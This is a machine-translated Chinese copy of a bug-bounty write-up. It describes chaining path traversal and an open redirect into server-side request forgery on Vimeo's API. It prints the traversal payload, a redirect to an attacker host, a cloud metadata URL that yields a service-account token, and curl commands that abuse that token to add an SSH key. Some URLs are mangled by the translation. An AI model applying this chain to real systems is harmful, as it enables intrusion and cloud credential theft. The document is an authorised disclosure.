<html>
<head>
<title>Vimeo SSRF with code execution potential.</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Vimeo SSRF与代码执行潜力。</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/vimeo-ssrf-with-code-execution-potential-68c774ba7c1e?source=collection_archive---------0-----------------------#2019-03-08">https://infosecwriteups.com/vimeo-ssrf-with-code-execution-potential-68c774ba7c1e?source=collection_archive---------0-----------------------#2019-03-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="0e18" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最近我在Vimeo上发现了一个半响应的SSRF，具有代码执行的可能性。这篇博文解释了我是如何发现并利用它的。所以让我们开始吧。</p><h2 id="2fc3" class="kl km iq bd kn ko kp dn kq kr ks dp kt jy ku kv kw kc kx ky kz kg la lb lc ld bi translated"><strong class="ak">背景。</strong></h2><p id="00b7" class="pw-post-body-paragraph jn jo iq jp b jq le js jt ju lf jw jx jy lg ka kb kc lh ke kf kg li ki kj kk ij bi translated">Vimeo为他们的API提供了一个名为<a class="ae lj" href="https://developer.vimeo.com/api/reference" rel="noopener ugc nofollow" target="_blank"> API Playground </a>的API控制台，使用这个web应用发出的请求是从服务器端完成的。以贝娄请求为例。</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi lk"><img src="../Images/7cb997443eb8928bda2b5354d361b3a2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*07VU1s92mu4Ssr6vMR2oDg.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">基本请求</figcaption></figure><p id="7c0e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个请求应该向服务器端发出GET请求</p><blockquote class="ma mb mc"><p id="3075" class="jn jo md jp b jq jr js jt ju jv jw jx me jz ka kb mf kd ke kf mg kh ki kj kk ij bi translated"><strong class="jp ir">https://api.vimeo.com/users/{user_id}/videos/{video_id}</strong></p></blockquote><p id="d73f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你仔细观察请求，你会发现我们在这里控制了很多东西，首先是<code class="fe mh mi mj mk b"><strong class="jp ir">uri</strong></code> <strong class="jp ir"> </strong>参数，它是要在端点上命中的端点，即在本例中是<code class="fe mh mi mj mk b"><strong class="jp ir">/users/{user_id}/videos/{video_id}</strong></code>，请求方法，即在本例中被设置为<code class="fe mh mi mj mk b"><strong class="jp ir">GET</strong></code> <strong class="jp ir"> </strong>，如果请求方法是post，这些参数应该是POST参数。user_id &amp; video_id是一种变量，其值在<code class="fe mh mi mj mk b"><strong class="jp ir">segments</strong></code> <strong class="jp ir"> </strong>参数中定义。</p><h2 id="34c8" class="kl km iq bd kn ko kp dn kq kr ks dp kt jy ku kv kw kc kx ky kz kg la lb lc ld bi translated"><strong class="ak">服务器端HTTP请求中的路径遍历。</strong></h2><p id="378b" class="pw-post-body-paragraph jn jo iq jp b jq le js jt ju lf jw jx jy lg ka kb kc lh ke kf kg li ki kj kk ij bi translated">我首先尝试将URI参数更改为我的自定义路径，但是URI的任何更改都会导致403，这意味着他们允许一组API端点。然而，改变诸如user_id &amp; videos_id这样的变量的值是可能的，因为它们是有意的，并且因为这些值反映在URL的路径中。传递<code class="fe mh mi mj mk b"><strong class="jp ir">../../../</strong></code> <strong class="jp ir"> </strong>会导致请求到<code class="fe mh mi mj mk b"><strong class="jp ir">api.vimeo.com</strong></code> <strong class="jp ir"> </strong> <br/>的根下面是什么情况。</p><blockquote class="ma mb mc"><p id="2284" class="jn jo md jp b jq jr js jt ju jv jw jx me jz ka kb mf kd ke kf mg kh ki kj kk ij bi translated"><code class="fe mh mi mj mk b"><strong class="jp ir">URL.parse(“https://api.vimeo.com/users/1122/videos/../../../attacker”)</strong></code></p></blockquote><p id="3ecc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果:<a class="ae lj" href="https://api.vimeo.com/attacker" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">https://api.vimeo.com/attacker</strong></a></p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi lk"><img src="../Images/94f08b1aad3afea412855eca26879e91.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*19kFzMWxgw9TeNnArYxGPQ.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">服务器端HTTP请求中的路径遍历</figcaption></figure><p id="63f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如您所见，在响应中列出了<code class="fe mh mi mj mk b"><strong class="jp ir">api.vimeo.com</strong></code>的所有端点，这是<code class="fe mh mi mj mk b"><strong class="jp ir">api.vimeo.com</strong></code>的根响应，如果您发出认证请求(带有授权头)。</p><h2 id="4e82" class="kl km iq bd kn ko kp dn kq kr ks dp kt jy ku kv kw kc kx ky kz kg la lb lc ld bi translated"><strong class="ak">现在怎么办？我们还在</strong> <code class="fe mh mi mj mk b"><strong class="ak">api.vimeo.com</strong></code> <strong class="ak">主机上，我们怎么逃呢？</strong></h2><p id="aef3" class="pw-post-body-paragraph jn jo iq jp b jq le js jt ju lf jw jx jy lg ka kb kc lh ke kf kg li ki kj kk ij bi translated">嗯，我认为这是遵循HTTP 30X重定向，这是一个很长的故事需要一点逻辑思维。</p><p id="3cb5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回到正题，现在我知道这是遵循HTTP重定向，我们很好地前进，我们需要一个开放的重定向，以便我们可以将服务器重定向到我们的受控资产。</p><h2 id="e22a" class="kl km iq bd kn ko kp dn kq kr ks dp kt jy ku kv kw kc kx ky kz kg la lb lc ld bi translated"><strong class="ak">优秀的旧内容发现… </strong></h2><p id="9d3b" class="pw-post-body-paragraph jn jo iq jp b jq le js jt ju lf jw jx jy lg ka kb kc lh ke kf kg li ki kj kk ij bi translated">一分钟的内容发现，我在<code class="fe mh mi mj mk b">api.vimeo.com</code>上遇到一个端点，它通过<code class="fe mh mi mj mk b">vimeo.com</code>上的受控路径重定向到<code class="fe mh mi mj mk b">vimeo.com</code></p><blockquote class="ma mb mc"><p id="ce0a" class="jn jo md jp b jq jr js jt ju jv jw jx me jz ka kb mf kd ke kf mg kh ki kj kk ij bi translated"><strong class="jp ir">https://api.vimeo.com/m/something</strong></p></blockquote><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi ml"><img src="../Images/e12f16b3391c7a2ab14723152871f23d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ASjV-YoneKJj99mH2bWfjQ.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">api.vimeo.com到vimeo.com</figcaption></figure><p id="5caa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">酷，现在我们有一个很大的范围来寻找一个开放重定向，我在vimeo.com有一个不太有用的开放重定向，我不会透露它的细节，但让我们假设它是这样的</p><blockquote class="ma mb mc"><p id="cae1" class="jn jo md jp b jq jr js jt ju jv jw jx me jz ka kb mf kd ke kf mg kh ki kj kk ij bi translated"><a class="ae lj" href="https://vimeo/vulnerable/open/redirect?url=https://attacker.com" rel="noopener ugc nofollow" target="_blank">https://vimeo/vulnerable/open/redirect？URL = https://attack . com</a></p></blockquote><p id="87f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这使得302号公路转向attacker.com，</p><h2 id="f8ab" class="kl km iq bd kn ko kp dn kq kr ks dp kt jy ku kv kw kc kx ky kz kg la lb lc ld bi translated"><strong class="ak">链已完成，可重定向至攻击者资产..</strong></h2><p id="e9eb" class="pw-post-body-paragraph jn jo iq jp b jq le js jt ju lf jw jx jy lg ka kb kc lh ke kf kg li ki kj kk ij bi translated">将服务器重定向到我们的受控资产的最终有效负载是</p><blockquote class="ma mb mc"><p id="4ab3" class="jn jo md jp b jq jr js jt ju jv jw jx me jz ka kb mf kd ke kf mg kh ki kj kk ij bi translated">../../../m/易受攻击/打开/重定向？URL = https://attack . com</p></blockquote><p id="6f3a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在video_id内部传递这个值将会以这种方式解析URL</p><blockquote class="ma mb mc"><p id="0d7a" class="jn jo md jp b jq jr js jt ju jv jw jx me jz ka kb mf kd ke kf mg kh ki kj kk ij bi translated">https://api.vimeo.com/users/1122/videos/../../../m/易受攻击/打开/重定向？URL = https://attack . com</p></blockquote><p id="83e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">解析后变成了</p><blockquote class="ma mb mc"><p id="de7c" class="jn jo md jp b jq jr js jt ju jv jw jx me jz ka kb mf kd ke kf mg kh ki kj kk ij bi translated"><a class="ae lj" href="https://api.vimeo.com/m/vulnerable/open/redirect?url=https://attacker.com" rel="noopener ugc nofollow" target="_blank">https://api.vimeo.com/m/vulnerable/open/redirect?URL = https://attack . com</a></p></blockquote><p id="1674" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">进行HTTP重定向并跟踪至</p><blockquote class="ma mb mc"><p id="6b63" class="jn jo md jp b jq jr js jt ju jv jw jx me jz ka kb mf kd ke kf mg kh ki kj kk ij bi translated"><a class="ae lj" href="https://vimeo.com/vulnerable/open/redirect?url=https://attacker.com" rel="noopener ugc nofollow" target="_blank">https://vimeo.com/vulnerable/open/redirect?URL = https://attack . com</a></p></blockquote><p id="ae39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">进行了另一次HTTP重定向并跟踪到</p><blockquote class="ma mb mc"><p id="d175" class="jn jo md jp b jq jr js jt ju jv jw jx me jz ka kb mf kd ke kf mg kh ki kj kk ij bi translated"><a class="ae lj" href="https://vimeo.com/vulnerable/open/redirect?url=https://attacker.com" rel="noopener ugc nofollow" target="_blank">https://attacker.com</a></p></blockquote><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi mm"><img src="../Images/41c67ab1fb841379838d1be52e01aae1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_pnPVl34KJq6PdrCjECxew.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">SSRF实现，编辑关于开放重定向和我的域的细节。</figcaption></figure><p id="bb39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">服务器期待一个JSON响应，解析它并在响应中显示。</p><h2 id="23d2" class="kl km iq bd kn ko kp dn kq kr ks dp kt jy ku kv kw kc kx ky kz kg la lb lc ld bi translated"><strong class="ak">剥削..</strong></h2><p id="cf92" class="pw-post-body-paragraph jn jo iq jp b jq le js jt ju lf jw jx jy lg ka kb kc lh ke kf kg li ki kj kk ij bi translated">由于Vimeo基础设施在Google cloud上，我的第一个尝试是使用Google metadata API。我采用了安德烈·巴普蒂斯塔的方法</p><p id="2a33" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此端点为我们提供服务帐户令牌。</p><blockquote class="ma mb mc"><p id="961b" class="jn jo md jp b jq jr js jt ju jv jw jx me jz ka kb mf kd ke kf mg kh ki kj kk ij bi translated"><a class="ae lj" href="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?fbclid=IwAR1EUeeTJhWLwfOb1-JXW1AF13QfJNXTBnuF7X1Uj1iXZ9FVjKz-F1U-CEY" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">http://metadata . Google . internal/computeMetadata/v1 beta 1/instance/service-accounts/default/token</strong></a><strong class="jp ir">？alt=json </strong></p></blockquote><pre class="ll lm ln lo gt mn mk mo mp aw mq bi"><span id="fea5" class="kl km iq mk b gy mr ms l mt mu">{ “headers”: [ “HTTP/1.1 200”, “Content-Type: application/json”, “Host: api.vimeo.com” ], “code”: 200, “body”: { “access_token”: “ya29.c.EmKeBq9XXDWtXXXXXXXXecIkeR0dFkGT0rJSA”, “expires_in”: 2631, “token_type”: “Bearer” } }</span></pre><p id="1f92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">令牌范围</strong></p><pre class="ll lm ln lo gt mn mk mo mp aw mq bi"><span id="0e95" class="kl km iq mk b gy mr ms l mt mu">$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  <br/> </span><span id="ee98" class="kl km iq mk b gy mv ms l mt mu">Response:</span><span id="6b26" class="kl km iq mk b gy mv ms l mt mu">{ "issued_to": "101302079XXXXX", "audience": "10130207XXXXX", "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", "expires_in": 2443, "access_type": "offline" }</span></pre><p id="a033" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我可以使用这个令牌将我的公共SSH密钥添加到实例中，然后通过我的私有密钥进行连接</p><pre class="ll lm ln lo gt mn mk mo mp aw mq bi"><span id="00ba" class="kl km iq mk b gy mr ms l mt mu">$ curl -X POST “https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" -H “Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA” -H “Content-Type: application/json” — data ‘{“items”: [{“key”: “harsh-bugdiscloseguys”, “value”: “harsh-ssrf”}]}</span><span id="2f7b" class="kl km iq mk b gy mv ms l mt mu"><br/>Response: </span><span id="eb87" class="kl km iq mk b gy mv ms l mt mu">{ “kind”: “compute#operation”, “id”: “63228127XXXXXX”, “name”: “operation-XXXXXXXXXXXXXXXXXX”, “operationType”: “compute.projects.setCommonInstanceMetadata”, “targetLink”: “https://www.googleapis.com/compute/v1/projects/vimeo-XXXXX", “targetId”: “10423XXXXXXXX”, “status”: “RUNNING”, “user”: “10423XXXXXXXX-compute@developer.gserviceaccount.com”, “progress”: 0, “insertTime”: “2019–01–27T15:50:11.598–08:00”, “startTime”: “2019–01–27T15:50:11.599–08:00”, “selfLink”: “https://www.googleapis.com/compute/v1/projects/vimeo-XXXXX/global/operations/operation-XXXXXX"}</span></pre><p id="e4f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有…</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi mw"><img src="../Images/bd5f173a34c77bb0ec05a222735404d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uDQldqL2zISUeXV8_6b0qg.png"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">添加了密钥</figcaption></figure><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi mx"><img src="../Images/b1c65d4f4aa510f5d8dd74e0ee9c4bf8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*AeRV_Dn4aOw8IJZf9ykxNQ.gif"/></div></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">*放开我</figcaption></figure><p id="b9db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然而，SSH端口只在内部网络上开放:((但这足以证明在内部这可以升级到shell访问。</p><p id="f066" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Kubernetes密钥也是从元数据API中提取的，但是由于某种原因，我无法使用它们，尽管Vimeo团队确认它们是有效的。</p><p id="7a22" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="md">由于我的工作&amp;涉及Vimeo，我被允许比正常情况下更深入地研究。</em>T11】</strong></p><p id="1deb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">就这样了，伙计们。我希望你喜欢这个。非常感谢分享/转发，对此有任何问题吗？DM @ <a class="ae lj" href="https://twitter.com/rootxharsh" rel="noopener ugc nofollow" target="_blank"> rootxharsh </a></p><h2 id="82dc" class="kl km iq bd kn ko kp dn kq kr ks dp kt jy ku kv kw kc kx ky kz kg la lb lc ld bi translated"><strong class="ak">感谢；</strong></h2><p id="9c53" class="pw-post-body-paragraph jn jo iq jp b jq le js jt ju lf jw jx jy lg ka kb kc lh ke kf kg li ki kj kk ij bi translated"><strong class="jp ir"> Vimeo团队</strong>允许披露此问题。</p><p id="8abf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lj" href="https://twitter.com/0xACB" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">安德烈(0xacb) </strong> </a>为他的<a class="ae lj" href="https://hackerone.com/reports/341876" rel="noopener ugc nofollow" target="_blank">牛逼的报告</a></p><p id="a1c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lj" href="https://twitter.com/bbuerhaus" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">布雷特(bbuerhaus) </strong> </a> <strong class="jp ir"> </strong>为他写起了关于<a class="ae lj" href="https://buer.haus/2017/03/09/airbnb-chaining-third-party-open-redirect-into-server-side-request-forgery-ssrf-via-liveperson-chat/" rel="noopener ugc nofollow" target="_blank">这个SSRF </a>(他和<a class="ae lj" href="https://twitter.com/NahamSec" rel="noopener ugc nofollow" target="_blank">本</a>都有一些点燃的AF写起)</p><h2 id="8cbf" class="kl km iq bd kn ko kp dn kq kr ks dp kt jy ku kv kw kc kx ky kz kg la lb lc ld bi translated">时间表</h2><p id="8b8d" class="pw-post-body-paragraph jn jo iq jp b jq le js jt ju lf jw jx jy lg ka kb kc lh ke kf kg li ki kj kk ij bi translated">1月28日清晨:初步发现。</p><p id="2566" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1月28日:由HackerOne团队进行分类</p><p id="6c39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1月28日:Vimeo团队奖励了最初的100美元，并推出了一个临时补丁。</p><p id="6a98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1月30日/31日:推出永久修复</p><p id="43ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2月1日:奖励4900美元。</p></div></div>    
</body>
</html>